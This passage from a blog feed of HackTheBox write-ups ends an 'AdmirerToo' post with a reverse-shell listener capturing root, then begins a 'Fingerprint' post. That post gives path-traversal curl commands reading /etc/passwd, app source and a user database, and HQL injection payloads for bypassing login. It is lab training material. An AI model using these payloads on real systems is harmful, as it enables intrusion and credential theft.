root:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 8585 ...</span><br><span class="line">10.129.96.181: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.14.67] from (UNKNOWN) [10.129.96.181] 60760</span><br><span class="line">root@admirertoo:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line">261xxxxxxxxxxxxxxxxxf80</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://github.com/OpenTSDB/opentsdb/issues/2051">OpenTSDB 2.4.0 Remote Code Execution</a><br><a href="https://research.securitum.com/fail2ban-remote-code-execution/">fail2ban – Remote Code Execution</a></p><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedback!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ssrf </tag>
            
            <tag> vhost </tag>
            
            <tag> ffuf </tag>
            
            <tag> fail2ban </tag>
            
            <tag> python </tag>
            
            <tag> port forwarding </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> phpggc </tag>
            
            <tag> CVE-2020-35476 </tag>
            
            <tag> CVE-2021-21311 </tag>
            
            <tag> CVE-2021-32749 </tag>
            
            <tag> opencats </tag>
            
            <tag> opentsdb </tag>
            
            <tag> whois </tag>
            
            <tag> regex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Fingerprint</title>
      <link href="/posts/fingerprint/"/>
      <url>/posts/fingerprint/</url>
      
        <content type="html"><![CDATA[<img width="578" alt="figerprint-hackthebox" src="https://user-images.githubusercontent.com/9076747/164230078-c1ddd0ba-54e1-4b8c-812f-43000d0b9cb9.png"><p>Fingerprint just retired on Hack The Box. It’s an ‘Insane’ difficulty Linux box.<br>As usual it was a really well designed box which required a ton of enumeration and going back and forth through all the findings. I had to make a mind-map to keep track of all the interesting findings and each could be linked together. The box doesn’t rely on common vulnerabilities but rather on little configuration and coding errors that allow you to chain vulnerabilities until you can obtain what you need. In the end it’s a tough but awesome box that allowed me to learn new techniques I was unfamiliar with before. Highly recommended.</p><p><strong>Tl;Dr:</strong> To get the user flag you first had to exploit a Local File Inclusion (LFI) vulnerability in the main app in order to retrieve its source code and database. You can then retrieve working credentials from the database to access the app. Once authenticated you can exploit an XSS to retrieve the user fingerprint which, linked to an HQL Injection allows to completely bypass the authentication in the second app. While connected you can then see a JSON Web Token (JWT) set as a cookie, decoding it return serialized information of the connected user including their Admin status. With more recon you can find some source code of the app, allowing you to retrieve the secret used to sign as well as the serialization logic. Using this information we can forge a new valid token to authenticate as admin. Being Admin unlocks a new feature, which, after reading through the source code, is vulnerable to blind command injection in the cookie decoding process; knowing this we can forge a cookie containing a reserve shell and get our initial access as <code>www-data</code> user. Once in the box we find a SUID binary belonging to <code>john</code> with basic <code>grep</code> functionalities. Since the binary belongs to <code>john</code> it can access it’s SSH private key, and searching character after character we can brute-force the whole key, connect as <code>john</code> and grab the user flag.</p><p>For the root flag you can find the source code of an improved version of the main application, running on port 8088. The source code shows the implementation of a new cookie logic using AES-ECB encryption. Knowing the weakness of the ECB algorithm we can launch a brute-force attack on the cookie generation logic in order to retrieve the secret used to create cookies. Once we have the secret we can easily forge a cookie for the admin user, exploiting a flaw in the admin cookie verification. Once authenticated as <code>admin</code>, we can exploit the initial LFI vulnerability we found at the beginning to access <code>root</code> account SSH private key and grab the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.118.212 fingerprint.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>And let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC fingerprint.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-16 15:48 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fingerprint.htb (10.129.118.212)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 90:65:07:35:be:8d:7b:ee:ff:3a:11:96:06:a9:a1:b9 (RSA)</span><br><span class="line">|   256 4c:5b:74:d9:3c:c0:60:24:e4:95:2f:b0:51:84:03:c5 (ECDSA)</span><br><span class="line">|_  256 82:f5:b0:d9:73:18:01:47:61:f7:f6:26:0a:d5:<span class="built_in">cd</span>:f2 (ED25519)</span><br><span class="line">80/tcp   open  http    Werkzeug httpd 1.0.1 (Python 2.7.17)</span><br><span class="line">|_http-server-header: Werkzeug/1.0.1 Python/2.7.17</span><br><span class="line">|_http-title: mylog - Starting page</span><br><span class="line">8080/tcp open  http    Sun GlassFish Open Source Edition  5.0.1</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT DELETE TRACE</span><br><span class="line">|_http-server-header: GlassFish Server Open Source Edition  5.0.1</span><br><span class="line">|_http-title: secAUTH</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 54.68 seconds</span><br></pre></td></tr></table></figure><p>On top of the usual SSH port, we can see two web ports open <code>80</code> and <code>8080</code>, which are respectively a Python Web App and a Sun Glassfish Server.</p><p>Once opened, we notice that both websites are simple landing pages and require authentication to use all the functionalities. </p><p>On one hand the main server, <code>gobuster</code> doesn’t allow us to find anything interesting and on the other hand the GlassFish server returns a few available endpoints:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://fingerprint.htb:8080/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://fingerprint.htb:8080/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /home/vagrant/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/04/16 16:18:38 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/META-INF             (Status: 301) [Size: 187] [--&gt; http://fingerprint.htb:8080/META-INF/]</span><br><span class="line">/WEB-INF              (Status: 301) [Size: 186] [--&gt; http://fingerprint.htb:8080/WEB-INF/]</span><br><span class="line">/backups              (Status: 301) [Size: 186] [--&gt; http://fingerprint.htb:8080/backups/]</span><br><span class="line">/j_security_check     (Status: 401) [Size: 1094]</span><br><span class="line">/login                (Status: 200) [Size: 1733]</span><br><span class="line">/resources            (Status: 301) [Size: 188] [--&gt; http://fingerprint.htb:8080/resources/]</span><br><span class="line">/upload               (Status: 405) [Size: 1184]</span><br><span class="line">/welcome              (Status: 302) [Size: 183] [--&gt; http://fingerprint.htb:8080/login</span><br></pre></td></tr></table></figure><p>Unfortunately they all return <code>404</code>, we probably need to be logged to access the resources.</p><p>Let’s try to focus on the main website to enumerate as much as possible and find useful output.</p><p>After trying <a href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#clusterbomb">Clusterbomb</a> mode with <code>ffuf</code> we can find two new endpoints, <code>/admin/view</code> and <code>/admin/delete</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -u http://fingerprint.htb/admin/FUZZ/FUZZ -mode clusterbomb -w common.txt -w common.txt</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.4.1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://fingerprint.htb/admin/FUZZ/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: common.txt</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: common.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">delete                  [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 45ms]</span></span><br><span class="line"><span class="string">view                    [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 51ms]</span></span><br></pre></td></tr></table></figure><h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><p>After digging around for a <em>very</em> long time and trying the most common exploit on both of these endpoints we finally a get positive result! </p><p>A Local File Inclusion (LFI) vulnerability in <code>/admin/view</code>/:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-as-is <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../etc/passwd&quot;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">[...]</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">john:x:1000:1000:john:/home/john:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flask:x:1001:1001::/home/flask:/bin/sh%</span><br></pre></td></tr></table></figure><p>We can see we have two users, <code>john</code> and <code>flask</code>. </p><p>We know from HTTP request that the server is Werkzeug, a Python Web Server Gateway Interface (WSGI) library. So it does make sense that the web application is running the very common Python web framework Flask.</p><p>After a bit of directory brute-force on the server (knowing the common app name format used in Flask project) we manage to retrieve the <code>app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-<span class="keyword">as</span>-<span class="keyword">is</span> <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../home/flask/app/app.py&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, request, render_template, session, g, url_for, send_file, make_response</span><br><span class="line"><span class="keyword">from</span> .auth <span class="keyword">import</span> check</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> isfile, join</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">LOG_PATH = <span class="string">&quot;/data/logs/&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;SjG$g5VZ(vHC;M2Xc/2~z(&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>():</span></span><br><span class="line">uid = session.get(<span class="string">&quot;user_id&quot;</span>)</span><br><span class="line">g.uid = uid</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">user = do_auth()</span><br><span class="line"><span class="keyword">if</span> user:</span><br><span class="line">session[<span class="string">&quot;user_id&quot;</span>] = user[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&quot;admin&quot;</span>), code=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> show_login()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_logs</span>(<span class="params">ip, logs</span>):</span></span><br><span class="line"><span class="keyword">if</span> ip.startswith(<span class="string">&#x27;127.0.&#x27;</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(logs)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(filtered_logs)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line"><span class="comment">#log_files = [(f, os.path.getsize(join(LOG_PATH, f))) for f in listdir(LOG_PATH) if isfile(join(LOG_PATH, f))]</span></span><br><span class="line">log_names = [f <span class="keyword">for</span> f <span class="keyword">in</span> listdir(LOG_PATH) <span class="keyword">if</span> isfile(join(LOG_PATH, f))]</span><br><span class="line">log_files = []</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> log_names:</span><br><span class="line">f = <span class="built_in">open</span>(join(LOG_PATH, name), <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">log_files.append((name, <span class="built_in">len</span>(filter_logs(request.remote_addr, data))))</span><br><span class="line"></span><br><span class="line">site_content=render_template(<span class="string">&#x27;admin.html&#x27;</span>, log_files=log_files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.uid <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> g.uid:</span><br><span class="line">resp = make_response(site_content, <span class="number">302</span>)</span><br><span class="line">resp.headers[<span class="string">&#x27;Location&#x27;</span>] = <span class="string">&#x27;/login&#x27;</span></span><br><span class="line"><span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> site_content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/view/&lt;path:log_path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logs_view</span>(<span class="params">log_path</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">path = LOG_PATH + log_path</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">data = file.readlines()</span><br><span class="line"><span class="keyword">return</span> filter_logs(request.remote_addr, data)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No such log found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/delete/&lt;path:log_path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logs_delete</span>(<span class="params">log_path</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">path = LOG_PATH + log_path</span><br><span class="line">os.remove(path)</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No such log found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_auth</span>():</span></span><br><span class="line">user = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> check(user, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_login</span>():</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)%</span><br></pre></td></tr></table></figure><p>Following the breadcrumbs in <code>app.py</code> we can retrieve other important files:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .auth <span class="keyword">import</span> check</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-<span class="keyword">as</span>-<span class="keyword">is</span> <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../home/flask/app/auth.py&quot;</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">user, password</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .util <span class="keyword">import</span> build_safe_sql_where</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;users.db&#x27;</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cond = build_safe_sql_where(&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line"></span><br><span class="line">query = <span class="string">&quot;select * from users &quot;</span> + cond</span><br><span class="line"></span><br><span class="line">cursor.execute(query)</span><br><span class="line"></span><br><span class="line">rows = cursor.fetchall()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> rows:</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>%</span><br></pre></td></tr></table></figure><h3 id="users-db-database"><a href="#users-db-database" class="headerlink" title="users.db database"></a>users.db database</h3><p>Upon reading the source code of <code>[app.py](http://app.py)</code> we know where to get the <code>users.db</code> database, let’s get it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-as-is <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../home/flask/app/users.db&quot;</span> -o users.db</span><br></pre></td></tr></table></figure><p>After opening it we can find the <code>admin</code> login and its clear text password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlite3 users.db</span><br><span class="line">SQLite version 3.38.2 2022-03-26 13:51:10</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">users</span><br><span class="line">sqlite&gt; SELECT * FROM users;</span><br><span class="line">0|admin|u_will_never_guess_this_password</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure><p>Ok, we got the <code>admin</code> credentials and can now connect to the website:</p><p><img src="https://user-images.githubusercontent.com/9076747/163688997-7d268b7c-07a4-450d-bc5a-abfc9de98fc5.png" alt="https://user-images.githubusercontent.com/9076747/163688997-7d268b7c-07a4-450d-bc5a-abfc9de98fc5.png"></p><p>The application only function seems to be displaying the <code>auth.log</code> file from this admin interface. When opening the file we can notice it’s the authentication log from the other application running on port 8080: </p><p><img src="https://user-images.githubusercontent.com/9076747/163689139-f8eccb2f-2169-457e-a6d8-e666a385fc68.png" alt="https://user-images.githubusercontent.com/9076747/163689139-f8eccb2f-2169-457e-a6d8-e666a385fc68.png"></p><h3 id="XSS-on-auth-log"><a href="#XSS-on-auth-log" class="headerlink" title="XSS on auth.log"></a>XSS on auth.log</h3><p>The first thing that comes to mind is <a href="https://www.notion.so/u_will_never_guess_this_password-ccf721841b4f4596bc477b33ec752f97">log poisoning</a> in order to achieve Remote Code Execution (RCE) from the RFI we found earlier. Unfortunately this won’t be possible since the app is running in Python and not PHP. </p><p>We can do self-XSS by inputting JavaScript in the username or password field but that won’t be helpful. Let’s move on.</p><p><img src="https://user-images.githubusercontent.com/9076747/163689525-da0d789c-4a6e-4e43-80a2-55f3d5cb8cd2.png" alt="https://user-images.githubusercontent.com/9076747/163689525-da0d789c-4a6e-4e43-80a2-55f3d5cb8cd2.png"></p><h3 id="HQL-Injection"><a href="#HQL-Injection" class="headerlink" title="HQL Injection"></a>HQL Injection</h3><p>I want to take the time to focus on the authentication page of the second app running on port 8080. </p><p>As any competent pen tester the first thing I tried was SQL injection on the password field but with no luck. Then I tried setting my username to <code>hg8&#39;</code> and surprisingly it worked and a <code>QueryException</code> got raised:</p><p><img src="https://user-images.githubusercontent.com/9076747/163690088-f1798f94-a65b-4cae-87fe-c2225bd9b719.png" alt="https://user-images.githubusercontent.com/9076747/163690088-f1798f94-a65b-4cae-87fe-c2225bd9b719.png"></p><p>It looks like the password field is filtered for SQL injection but not the username field.</p><p>I was unfamiliar with <code>Hibernate</code>, turns out it’s a query language (HQL): </p><blockquote><p>Hibernate uses a powerful query language (HQL) that is similar in appearance to SQL. Compared with SQL, however, HQL is fully object-oriented and understands notions like inheritance, polymorphism and association.<br><a href="https://docs.jboss.org/hibernate/core/3.3/reference/en/html/queryhql.html">https://docs.jboss.org/hibernate/core/3.3/reference/en/html/queryhql.html</a></p></blockquote><p>When trying the most common injection <code>uid=x&#39; OR 1 = 1 and &#39;&#39;=&#39;&amp;auth_primary=x&amp;auth_secondary=15ada043824662a14c90f70a82f31a25</code> we get a new error message:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.persistence.NonUniqueResultException: query did <span class="keyword">not</span> <span class="keyword">return</span> a <span class="keyword">unique</span> <span class="keyword">result</span>: <span class="number">2</span></span><br></pre></td></tr></table></figure><p>Seems like we have 2 users in the database. I manually tried <code>admin</code> and <code>john</code> but neither worked.</p><p>HQL does not support UNION queries nor comments, which make it difficult to exfiltrate table information.<br>Then, one technique we can use is <code>substring()</code> to iterate on each character of the username.</p><p>We can imagine the query run by the app being the following format:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> u <span class="keyword">FROM</span> Users u <span class="keyword">WHERE</span> u.uid <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> authprimary <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">AND</span> authsecondary <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>We can try the following injection <code>x&#39; OR SUBSTRING(uid,1,1)=&#39;a&#39; and &#39;&#39;=&#39;</code> which will end up in the following query:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> u <span class="keyword">FROM</span> Users u <span class="keyword">WHERE</span> u.uid <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">OR</span> <span class="built_in">SUBSTRING</span>(uid,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span 